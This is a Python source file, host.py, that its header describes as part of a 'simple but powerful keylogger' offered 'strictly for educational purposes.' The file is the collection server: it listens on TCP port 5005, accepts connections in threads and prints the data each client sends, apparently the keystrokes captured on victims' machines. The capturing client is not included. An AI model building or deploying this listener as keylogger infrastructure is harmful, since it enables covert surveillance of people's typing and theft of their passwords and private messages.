#Creator: PierreIsHere
#Date: 03/03/2019
#Purpose: Simple but powerful keylogger, strictly for educational purposes
#Filename: host.py
import socket
import sys
from _thread import *

host = ''
port = 5005
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
try:
    s.bind((host, port))
except socket.error as e:
    print(str(e))

s.listen(5)
print('Waiting for a connection.')

def threaded_client(conn):
    while True:
        data = conn.recv(256)
        data = data.decode('utf-8')
        # client.send(reply.encode())
        print(data)
        if not data:
            break

    conn.close()

while True:

    conn, addr = s.accept()
    # print('connected to: '+addr[0]+':'+str(addr[1]))

    start_new_thread(threaded_client,(conn,))
